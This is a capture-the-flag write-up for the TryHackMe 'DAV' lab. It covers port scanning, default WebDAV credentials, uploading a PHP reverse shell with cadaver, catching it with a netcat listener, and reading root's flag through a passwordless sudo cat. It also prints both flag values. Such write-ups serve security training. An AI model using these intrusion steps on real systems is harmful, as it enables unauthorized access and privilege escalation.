@@ -1,0 +1,238 @@
+### TryHackMe - DAV CTF ###
+
+Room objectives: This write-up covers the WebDAV CTF from TryHackMe, focusing on service enumeration, exploitation of a misconfigured WebDAV service, remote code execution, and privilege escalation.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Let's start running quick port scan with RustScan, you can use any port scanner you want but I prefer this one because is quicker.
+
+┌──(kali㉿kali)-[~]
+└─$ rustscan -a 10.65.128.190 --ulimit=5000
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Open ports, closed hearts.
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.65.128.190:80
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Ok, so we can get further information about the port 80 with nmap.
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -A -sV -p 80 10.65.181.35
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 18:40 EST
+Nmap scan report for 10.65.181.35
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Ok, so we have only  the port 80 open without any relevant information, but assuming the name of the CTF is DAV, I immediately tried to access the directory /webdav/ service and it exists! But it requires login.. before we try to get the credentials 
+I tried to run a directory enumeration with gobuster and see if there was any other page on this address.
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u 10.65.181.35 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.65.181.35
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/webdav               (Status: 401) [Size: 459]
+Progress: 87662 / 87662 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I tried to capture the login request, and start a brute-forcing, but the results don't even show the user and password as basic authorization was enabled.
+
+GET /webdav/ HTTP/1.1
+Host: 10.65.181.35
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46YWRtaW4=
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Then I wondered, why don't try default login credentials? So, with a quick search I found the user "wampp" and "xampp" and it worked!
+
+After we get the login credentials I used a tool called davtest to test sending some files to the server.
+
+┌──(kali㉿kali)-[~]
+└─$ davtest -auth wampp:xampp -url 10.65.181.35/davtest -auth wampp:xampp -url http://10.65.181.35/webdav/
+webdav/
+********************************************************
+ Testing DAV connection
+OPEN            SUCCEED:                http://10.65.181.35/webdav
+********************************************************
+NOTE    Random string for this session: o0VG_q3
+********************************************************
+ Creating directory
+MKCOL           SUCCEED:                Created http://10.65.181.35/webdav/DavTestDir_o0VG_q3
+********************************************************
+ Sending test files
+PUT     txt     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.txt
+PUT     shtml   SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.shtml
+PUT     jhtml   SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.jhtml
+PUT     php     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.php
+PUT     jsp     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.jsp
+PUT     cgi     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.cgi
+PUT     asp     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.asp
+PUT     pl      SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.pl
+PUT     aspx    SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.aspx
+PUT     cfm     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.cfm
+PUT     html    SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.html
+********************************************************
+ Checking for test file execution
+EXEC    txt     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.txt
+EXEC    txt     FAIL
+EXEC    shtml   FAIL
+EXEC    jhtml   FAIL
+EXEC    php     SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.php
+EXEC    php     FAIL
+EXEC    jsp     FAIL
+EXEC    cgi     FAIL
+EXEC    asp     FAIL
+EXEC    pl      FAIL
+EXEC    aspx    FAIL
+EXEC    cfm     FAIL
+EXEC    html    SUCCEED:        http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.html
+EXEC    html    FAIL
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://10.65.181.35/webdav/DavTestDir_o0VG_q3
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.txt
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.shtml
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.jhtml
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.php
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.jsp
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.cgi
+PUT File: http://10.65.181.35/webdav/DavTestDir_o0VG_q3/davtest_o0VG_q3.asp
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+The important above is that we can send PHP files and execute them via the web directory, so I decided to use the php-reverse-shell exploit.
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Make sure you setup the fields below correctly with your IP address and port desired.
+
+$ip = 'YOUR_IP';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Now all we have to do is to put the payload in the web directory via cadaver tool.
+
+
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cadaver http://10.65.181.35/webdav
+Authentication required for webdav on server `10.65.181.35':
+Username: wampp
+Password: 
+dav:/webdav/> put php-reverse-shell.php 
+Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
+Progress: [=============================>] 100.0% of 5497 bytes succeeded.
+dav:/webdav/>
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+You can now F5 the page and see your payload there, but before running it let's start a port listener on our PC to receive the connection.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                                                          
+listening on [any] 4444 ...
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Run the payload and you should receive a connection, used the find command to search for the user.txt file, and found under the /home/merlin/ directory.
+
+$ find / -name user.txt
+find: '/etc/ssl/private': Permission denied
+find: '/home/merlin/.cache': Permission denied
+/home/merlin/user.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+$ cat user.txt
+449b40fe93f78a938523b7e4dcd66d2a
+user.txt: 449b40fe93f78a938523b7e4dcd66d2a
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Now, we need to elevate our privileges to root and the root flag, I tried to search for SUID permissions.
+
+$ find / -perm -4000 -type f 2>/dev/null     
+/bin/ping6
+/bin/mount
+/bin/ping
+/bin/umount
+/bin/fusermount
+/bin/su
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/gpasswd
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Nothing really relevant, ran sudo -l and I found out I can use the cat command without any password.
+
+$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /bin/cat
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Using cat with sudo, we were able to read the root flag successfully.
+
+$ sudo cat /root/root.txt
+101101ddc16b0cdf65ba0b8a7af7afa5
+
+root.txt: 101101ddc16b0cdf65ba0b8a7af7afa5
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
